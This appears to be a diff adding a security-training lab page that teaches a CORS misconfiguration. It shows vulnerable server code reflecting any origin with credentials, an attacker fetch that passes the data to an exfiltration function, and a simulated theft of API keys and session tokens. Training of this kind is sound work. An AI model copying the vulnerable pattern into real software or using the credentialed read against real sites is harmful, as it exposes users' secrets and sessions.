@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: CORS Wildcard with Credentials - CORS Level 1</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">CORS #1: Wildcard with Credentials</span>
+      <span class="difficulty medium">Medium</span>
+    </div>
+  </div>
+  <div id="solve-banner" class="solve-banner"></div>
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Steal the victim's secret API data by exploiting a CORS misconfiguration. The API at <code>/api/cors-demo/secrets</code> reflects any Origin header with <code>Access-Control-Allow-Credentials: true</code>. Read the victim's data from an attacker page.</p>
+      </div>
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: What is CORS?</button>
+        <div class="hint-content">CORS (Cross-Origin Resource Sharing) controls which origins can read API responses. When a server reflects any Origin with <code>Access-Control-Allow-Credentials: true</code>, any website can make authenticated requests and READ the response — stealing user data.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: The exploit</button>
+        <div class="hint-content">From an attacker page, use <code>fetch('/api/cors-demo/secrets', {credentials: 'include'})</code>. Because the server reflects the attacker's origin with credentials allowed, the browser lets the attacker page read the response containing the victim's secrets.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Steps</button>
+        <div class="hint-content">1. Log in as victim to establish a session cookie<br>2. Click "Launch CORS Attack" — this simulates an attacker page making a credentialed fetch<br>3. The API returns the victim's secrets because it trusts any origin<br>4. The attacker page reads and displays the stolen data</div>
+      </div>
+      <h3>Vulnerable Code</h3>
+      <div class="source-code">
+<pre><span class="comment">// Server: reflects ANY origin</span>
+app.get('/api/cors-demo/secrets', (req, res) => {
+  <span class="keyword">const</span> origin = req.headers.origin;
+  res.header('Access-Control-Allow-Origin',
+    <span class="sink">origin</span>);
+  res.header('Access-Control-Allow-Credentials',
+    <span class="sink">'true'</span>);
+  res.json({ apiKey, ssn, sessions });
+});
+
+<span class="comment">// Attacker page:</span>
+<span class="function">fetch</span>('/api/cors-demo/secrets', {
+  credentials: <span class="string">'include'</span>
+}).then(r => r.json())
+  .then(data => <span class="sink">exfiltrate</span>(data));
+</pre>
+      </div>
+    </div>
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128274; Login as Victim</h2>
+          <div style="display:flex;gap:8px;align-items:end">
+            <div style="flex:1"><label>Username</label><input type="text" id="loginUser" value="victim" style="margin-bottom:0"></div>
+            <div style="flex:1"><label>Password</label><input type="password" id="loginPass" value="password123" style="margin-bottom:0"></div>
+            <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          </div>
+          <div id="login-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div class="lab-form" style="margin-top:16px">
+          <h2 style="margin-bottom:16px">&#127760; Your Secret Data (normal access)</h2>
+          <button class="btn btn-primary" onclick="fetchSecrets()">Fetch My Secrets (same-origin)</button>
+          <div id="secrets-display" class="vuln-output" style="margin-top:12px;min-height:60px">
+            <p style="color:var(--text-muted)">Login and click to view your secrets...</p>
+          </div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <div class="lab-form" style="border:2px solid var(--danger);background:var(--danger-light)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; CORS Attack (attacker page simulation)</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">This simulates an attacker's website making a cross-origin request to steal your data. It works because the API reflects any origin with credentials.</p>
+          <button class="btn btn-danger" onclick="launchCORSAttack()">Launch CORS Attack</button>
+          <div id="attack-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">Stolen Data</div>
+            <div id="stolen-data"><div class="log" style="color:#94a3b8">No data stolen yet...</div></div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px">
+          <p style="font-size:13px;color:var(--text-secondary)"><strong>Real-world context:</strong> This exact misconfiguration was found on Acorns (graphql.acorns.com), Indeed (flex-core-us.indeed.com), and DICE FM — all reflecting any origin with credentials. Impact: any website the victim visits can silently steal their API keys, session tokens, and personal data. These are typically HIGH/CRITICAL severity findings worth $1K-$10K+.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="/js/app.js"></script>
+  <script>
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method: 'POST', headers: {'Content-Type':'application/json'}, credentials: 'include',
+        body: JSON.stringify({username: document.getElementById('loginUser').value, password: document.getElementById('loginPass').value})
+      }).then(r => r.json()).then(data => {
+        document.getElementById('login-status').innerHTML = data.success ?
+          '<span style="color:var(--success)">Logged in as ' + data.user.username + '</span>' :
+          '<span style="color:var(--danger)">Failed</span>';
+      });
+    }
+
+    function fetchSecrets() {
+      fetch('/api/cors-demo/secrets', {credentials: 'include'})
+        .then(r => r.json())
+        .then(data => {
+          document.getElementById('secrets-display').innerHTML =
+            '<pre style="font-size:12px;color:var(--text-secondary)">' + JSON.stringify(data, null, 2) + '</pre>';
+        })
+        .catch(e => {
+          document.getElementById('secrets-display').innerHTML = '<p style="color:var(--danger)">Error: ' + e.message + ' (login first)</p>';
+        });
+    }
+
+    function launchCORSAttack() {
+      var stolen = document.getElementById('stolen-data');
+      stolen.innerHTML = '<div class="log">Sending cross-origin request with credentials...</div>';
+
+      // This simulates what an attacker page would do
+      // In a real attack, this fetch would come from attacker.com
+      // The browser allows reading the response because CORS headers permit it
+      fetch('/api/cors-demo/secrets', { credentials: 'include' })
+        .then(r => {
+          stolen.innerHTML += '<div class="log">Response received! CORS allowed the read.</div>';
+          stolen.innerHTML += '<div class="log">Access-Control-Allow-Origin: ' + (r.headers.get('access-control-allow-origin') || '*') + '</div>';
+          stolen.innerHTML += '<div class="log">Access-Control-Allow-Credentials: true</div>';
+          return r.json();
+        })
+        .then(data => {
+          if (data.error) {
+            stolen.innerHTML += '<div class="log" style="color:#ef4444">Not authenticated. Login as victim first!</div>';
+            return;
+          }
+          stolen.innerHTML += '<div class="log" style="color:#ef4444">--- STOLEN DATA ---</div>';
+          stolen.innerHTML += '<div class="log" style="color:#ef4444">API Key: ' + data.apiKey + '</div>';
+          stolen.innerHTML += '<div class="log" style="color:#ef4444">SSN Last 4: ' + data.ssn_last4 + '</div>';
+          stolen.innerHTML += '<div class="log" style="color:#ef4444">Internal Notes: ' + data.internalNotes + '</div>';
+          stolen.innerHTML += '<div class="log" style="color:#ef4444">Session Token: ' + (data.sessions?.[0]?.token || 'N/A') + '</div>';
+          stolen.innerHTML += '<div class="log" style="color:#ef4444">--- FULL ATO POSSIBLE ---</div>';
+
+          document.getElementById('attack-status').innerHTML =
+            '<span style="color:var(--danger);font-weight:bold">Data stolen! API key + session token exfiltrated.</span>';
+          solveLab('cors-1');
+        });
+    }
+
+    // Auto-check login
+    fetch('/api/auth/me', {credentials:'include'}).then(r=>r.json()).then(d => {
+      if (d.user) document.getElementById('login-status').innerHTML = '<span style="color:var(--success)">Logged in as ' + d.user.username + '</span>';
+    }).catch(()=>{});
+  </script>
+</body>
+</html>
